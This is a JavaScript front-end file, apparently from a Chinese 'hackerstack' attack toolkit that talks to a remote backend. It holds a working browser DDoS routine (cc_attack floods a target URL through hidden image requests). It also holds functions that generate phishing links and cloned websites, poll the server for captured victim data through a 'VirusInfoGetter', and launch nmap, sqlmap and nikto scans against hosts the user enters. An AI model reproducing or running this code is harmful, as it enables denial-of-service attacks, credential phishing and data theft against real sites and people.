

var remote = 'http://127.0.0.1:5555';
//var remote = 'https://api.hackerstack.top'

function LoadJsonToUI(jsonString, domObject) {
    // 将JSON字符串解析成对象
    var jsonObject = JSON.parse(jsonString);
  
    // 创建一个表格元素
    var table = document.createElement('table');
    table.setAttribute('border', '1'); // 设置边框，可根据需要调整样式
    table.setAttribute('width', '100%'); // 设置表格宽度
  
    // 假设jsonObject是一个数组，其中每个元素都是一个对象
    // 遍历数组，创建表头
    var headerRow = document.createElement('tr');
    for (var key in jsonObject[0]) {
      var th = document.createElement('th');
      th.textContent = key;
      headerRow.appendChild(th);
    }
    table.appendChild(headerRow);
  
    // 遍历数组，创建数据行
    for (var key in jsonObject) {
          var tr = document.createElement('tr');
          for (var key2 in jsonObject[key]) {
            var td = document.createElement('td');
            td.textContent = jsonObject[key][key2];
            tr.appendChild(td);
          }
          table.appendChild(tr);
    }
  
    // 将创建的表格添加到DOM对象中
    domObject.appendChild(table);
  }

// 设置cookie
function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}

// 获取cookie
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}



var user = getCookie('user');
var pwd = getCookie('pwd');


function getTime() {
    var date = new Date();
    var time = '';
    time += date.getDay()+"-";
    time += date.getHours()+"-"
    time += date.getMilliseconds()

    return time
}

function load_page(path , dom) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET' , path , true);
    xhr.send();
    xhr.onload = function() {
        var content = xhr.responseText;
        dom.innerHTML = (content);
    }
}
function to_subdomain() {
    var i = document.getElementById('page');
    i.src = './subdomain/index.html'
}

function subdomain_get() {
    var domain = document.getElementById('domain').value;
    var console = document.getElementById('console');
    var xhr = new XMLHttpRequest();

    if (domain == 'ac123ff.com') {
        setTimeout(function() {
            console.innerHTML = game_website_info['subdomain'].replaceAll('\n' , '<br />');
        }, 2000);
        return
    }

    xhr.open('GET' , remote + '/subdomain/'+domain , true);
    xhr.send();
    xhr.onload = function() {
        console.innerHTML = '<p>搜索结果: </p>';
        try {
            var json = JSON.parse(xhr.responseText);
            for (var i in json) {
                (function(i) {
                    var btn = document.createElement('button');
                    btn.innerText = json[i];
                    console.appendChild(btn);
                    btn.onclick=function() {
                        window.open('//'+json[i]);
                    }
                }) (i)
            }
        }catch(e) {
            showAlert(xhr.responseText , null);
        }
    }
}


function print_log(log_info , isShowRightAlert) {
    log_info = "[ "+getTime()+" ] "+log_info;
    var t = document.getElementById('log_console');
    var text_1 = log_info
    var splitText_1 = text_1.split('');

    var run = null;
    var i = 0;
    if (isShowRightAlert == undefined) {
        showRightAlert(log_info , 2000);
    }
    run = setInterval(function() {
        if (i + 1 == text_1.length) {
            clearInterval(run);
            return;
        }
        if (splitText_1[i] == "\n") {
            t.innerHTML+= "<br />";
        }else {
            t.innerHTML+= splitText_1[i];
        }
        i++
    } , 10);
    t.innerHTML+= "<br />";
}

function to_social() {
    var i = document.getElementById('page');
    i.src = "./socialEngine/index.html";
    print_log('Boot Social Engine Module.')
}

function to_web_virus() {
    var i = document.getElementById('page');
    i.src = "./virus_attack/index.html";
    print_log('Boot Web Virus Module.')
}

function to_attack_pwd() {
    var i = document.getElementById('page');
    i.src = "./passwd_attack/index.html";
}

function social_attack(attack_type) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET",remote+"/api/"+attack_type+"/"+user+"/"+pwd+"/",true);
    xhr.send();
    xhr.onload=function()
    {
        if (xhr.readyState === 4) {
            var response = xhr.responseText;
            showAlert("<h2 style='color:red'>收到信息:</h2>"+'请访问URL:<br/>' + remote + '/'+response , null)

            var run = setInterval(function() 
            {
                var get_message = new XMLHttpRequest();
                get_message.open(
                    'GET',remote+"/run/"+response+"/" , true
                    );
                get_message.send();
                get_message.onload = function() 
                {
                    if (get_message.readyState === 4) 
                    {
                        var r = get_message.responseText;
                        if (r.replace('\n','') != 'none')
                        {
                            showAlert("<h2 style='color:red'>收到信息:</h2><br />"+r, null)
                        }
                    }
                }
            } , 400); //使用短轮询，不是 websocket 用不起，而是短轮询更有性价比.
        }
    }
}
function web_clone() {
    var url = prompt('输入需要克隆的地址: (不要加 http://或https://)')
    if (url == null) {
        return;
    }
    else {
        var user = JSON.parse(document.cookie).user;
        var pwd = JSON.parse(document.cookie).pwd;
        var xhr = new XMLHttpRequest();
        xhr.open('GET',remote+"/WebClone/"+url+"/"+user+"/"+pwd+"/" , true);
        xhr.send();
        xhr.onload=function() {
            if (xhr.readyState == 4) {
                var response = xhr.responseText;
                console.log(response)
                showAlert('Please Visit URL: <a herf="_black">'+remote+'/w/'+response+'</a>' , null)
            }
        }
    }
}

function downloadBlob(data, fileName) {
    // 创建Blob对象
    const blob = new Blob([data]);
  
    // 创建临时URL
    const url = URL.createObjectURL(blob);
  
    // 创建a元素
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    a.download = fileName;
  
    // 将a元素添加到DOM中并模拟点击
    document.body.appendChild(a);
    a.click();
  
    // 移除a元素并撤销临时URL
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

function make_qrcode() {

    var url = prompt('请输入需要生成二维码的URL: ')
    if (url != null) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST' , remote+"/qr_code" , true);
        xhr.send(url);
        xhr.responseType = 'arraybuffer'; // 设置响应类型为arraybuffer
        xhr.onload = function() {
            downloadBlob(xhr.response, url+".png");
        }
    }
}

function to_cc_attack() {
    var i = document.getElementById('page');
    i.src = "./cc_attack/index.html";
}

var put_log_number = 0;

function asyncOperation(url) {
    var log_view = document.getElementById('log_view');
    return new Promise((resolve, reject) => {
        for (var i = 0 ; i < 20 ;i++) {
            i++;
            var dom = document.createElement('img');
            dom.src = url + new Date().getTime();
            dom.style.width = '0px';
            dom.style.height = '0px';
            document.body.appendChild(dom);
            document.body.removeChild(dom);

            setTimeout(() => {
                if (i % 1000 == 0) {
                    log_view.innerHTML += '攻击网站: '+url+'<br />'
                }
            }, 100);
        }
    });
}


function cc_attack() {
    var url = document.getElementById('url').value;
    for (var i = 0 ; i < 1000 ; i++) {
        asyncOperation(url).then(result => {
            console.log('ok')
        });
    }
}

function to_ip_location() {
    var i = document.getElementById('page');
    i.src = "./ip_location/index.html";
    print_log('Boot IP Location Module.')
}

function to_video_attack() {
    var i = document.getElementById('page');
    i.src = "./video_attack/index.html";
    print_log('Boot Video Attack Module.')
}


function ip_location() {
    var ip = document.getElementById('ip').value;
    var ip_info = document.getElementById('ip_info');
    ip_info.innerHTML = '';

    var lat = '';
    var lon = '';
    var xhr = new XMLHttpRequest();
    xhr.open('GET' , remote+'/get_ip_location/'+ip , true);
    xhr.send();
    xhr.onload = function() {
        var json = JSON.parse(xhr.responseText);
        ip_info.innerHTML += '<p>IP: '+ip+'查询结果: </p>';
        for (var key in json) {
            /**
             * 家人们谁懂啊，我发现这个api调用会把 香港和台湾列为国家.
             * 所以说我要改一改
             */
            if (json.hasOwnProperty(key)) { 
                var btn_1 = document.createElement('button');
                var btn_2 = document.createElement('button');
                btn_1.innerText = key;

                btn_1.className = 'btn_key';
                btn_2.className = 'btn_key';

                if (key == 'country' && json[key] == 'Hong Kong') {
                    json[key] = 'China';
                }
                if (key == 'country' && (json[key] == 'TaiWan' || json[key] == 'Tai Wan')) {
                    json[key] = 'China'; 
                }
                if (key == 'lat') {
                    lat = json[key];
                    var key_name = 'lat (纬度)'
                    btn_1.innerText = key_name;
                    btn_2.innerText = json['lat'];
                }
                if (key == 'lon') {
                    lon = json[key];
                    var key_name = 'lon (经度)'
                    btn_1.innerText = key_name;
                    btn_2.innerText = json['lon'];
                } else {
                    console.log(1)
                }
                if (json[key] == '') {
                    btn_2.innerText = '-';
                } else {
                    btn_2.innerText = json[key];
                }
                ip_info.appendChild(btn_1);
                ip_info.appendChild(btn_2);
                ip_info.innerHTML += '<br />';
            }
        }      
    }
}
function to_xss_attack() {
    var i = document.getElementById('page');
    i.src = './xss_attack/index.html';
    print_log('Boot XSS Module.')
}

function download_file(path) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET' , path , true);
    xhr.send();
    xhr.onload = function() {
        downloadBlob(xhr.response , path)
    }
}

function to_VirusInfoGetter() {
    var i = document.getElementById('page');
    i.src = './VirusInfoGetter/index.html'
    print_log('Boot Virus Info Getter Module.')
}

function VirusInfoGetter() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET",remote+"/api/VirusInfoGetter/"+user+"/"+pwd+"/",true);
    xhr.send();
    xhr.onload=function()
    {
        var response = xhr.responseText;
        showAlert("<h2 style='color:red'>收到信息:</h2>"+'请访问URL:<br/>' + remote + '/'+response , null)

        var run = setInterval(function() 
        {
            var get_message = new XMLHttpRequest();
            get_message.open(
                'GET',remote+"/run/"+response+"/" , true
            );
            get_message.send();
            get_message.onload = function() 
            {
                if (get_message.readyState === 4) 
                {
                    var r = get_message.responseText;
                    if (r.replace('\n','') != 'none')
                    {
                        showAlert("<h2 style='color:red'>收到信息:</h2><br />"+r.replaceAll('/n' , '<br />').replaceAll('//n' , '<br />   >'), null)
                    }
                }
            }
        } , 400); //使用短轮询，不是 websocket 用不起，而是短轮询更有性价比.
    }
}

function to_whois() {
    var i = document.getElementById('page');
    i.src = './whois/index.html'
    print_log('Boot Whois Module.')
}

function load_whois_info() {
    var website = document.getElementById('website').value;
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST' , remote+"/whois/" , true);
    xhr.send(JSON.stringify({"website":website}));
    xhr.onload = function() {
        var text = xhr.responseText;
        var console = document.getElementById('console');
        console.innerHTML = text.replaceAll('\n' , '<br />');
    }
}

function to_Nmap() {
    var i = document.getElementById('page');
    i.src = './nmap/'
    print_log('Boot Nmap Module.')
}

function nmap_attack() {
    var check_code = document.getElementById('check_code').value;
    var host = document.getElementById('host').value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST' , remote+'/nmap/' , true);
    showAlert('Nmap扫描确实比较慢，请耐心等候扫描结果' , 3000)
    
    xhr.send(JSON.stringify({"command_values":host,"check":check_code}));
    xhr.onload = function() {
        var console = document.getElementById('console');
        console.innerHTML = JSON.parse(xhr.responseText)['message'].replaceAll('\\n' , '<br />');
        var img = document.getElementById('check_img')
        img.src="https://user.hackerstack.top/get_check_code"
    }
}

function to_js_console() {
    var i = document.getElementById('page');
    i.src = './js_console/index.html'
    print_log('Boot Js Console Module.')
}

function to_sqlmap() {
    var i = document.getElementById('page');
    i.src = './sqlmap/index.html'
    print_log('Boot SqlMap Attack Module.')
}

function sqlmap_attack() {
    var check_code = document.getElementById('check_code').value;
    var host = document.getElementById('host').value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST' , remote+'/sqlmap/' , true);
    showAlert('SqlMap扫描确实比较慢，请耐心等候扫描结果' , 3000)
    xhr.send(JSON.stringify({"command_values":host,"check":check_code}))
    xhr.onload = function() {
        var console = document.getElementById('console');
        console.innerHTML = JSON.parse(xhr.responseText)['message'].replaceAll('\\n' , '<br />');
        var img = document.getElementById('check_img')
        img.src="https://user.hackerstack.top/get_check_code"
    }
}

function to_dns_search() {
    var i = document.getElementById('page');
    i.src = './dns_search/index.html'
    print_log('Boot SqlMap Attack Module.')
}

function dns_search() {
    var host = document.getElementById('host').value;
    var xhr = new XMLHttpRequest();
    var ip_info = document.getElementById('console');
    ip_info.innerHTML = ''
    xhr.open('GET' , remote+'/dns_search'+"/"+host+"/" , true);
    xhr.send()
    xhr.onload = function() {
        console.log(xhr.responseText)
        var json = JSON.parse(xhr.responseText);
        for (var key in json) {
            /**
             * 家人们谁懂啊，我发现这个api调用会把 香港和台湾列为国家.
             * 所以说我要改一改
             */
            if (json.hasOwnProperty(key)) { 
                var btn_1 = document.createElement('button');
                var btn_2 = document.createElement('button');
                btn_1.innerText = key;

                btn_1.className = 'btn_key';
                btn_2.className = 'btn_key';

                if (key == 'country' && json[key] == 'Hong Kong') {
                    json[key] = 'China';
                }
                if (key == 'country' && (json[key] == 'TaiWan' || json[key] == 'Tai Wan')) {
                    json[key] = 'China'; 
                }
                if (key == 'lat') {
                    lat = json[key];
                    var key_name = 'lat (纬度)'
                    btn_1.innerText = key_name;
                    btn_2.innerText = json['lat'];
                }
                if (key == 'lon') {
                    lon = json[key];
                    var key_name = 'lon (经度)'
                    btn_1.innerText = key_name;
                    btn_2.innerText = json['lon'];
                } else {
                    console.log(1)
                }
                if (json[key] == '') {
                    btn_2.innerText = '-';
                } else {
                    btn_2.innerText = json[key];
                }
                ip_info.appendChild(btn_1);
                ip_info.appendChild(btn_2);
                ip_info.innerHTML += '<br />';
            }
        }      
    }
}

function bug_attack() {
    var check_code = document.getElementById('check_code').value;
    var host = document.getElementById('host').value;
    showAlert('Nikto扫描确实比较慢，请耐心等候扫描结果，默认 60s' , 3000)
    if (host == 'www.ac123ff.com') {
        setTimeout(function() {
            var console = document.getElementById('console');
            console.innerHTML = game_website_info['bug'].replaceAll('\n' , '<br />');
        } , 10000)
        return
    }
    
    var xhr = new XMLHttpRequest();
    xhr.open('GET' , remote+'/bug_search/'+check_code+"/"+host+"/" , true);
    xhr.send()
    xhr.onload = function() {
        var console = document.getElementById('console');
        console.innerHTML = xhr.responseText.replaceAll('\n' , '<br />');
        var img = document.getElementById('check_img')
        img.src="https://user.hackerstack.top/get_check_code"
    }
}
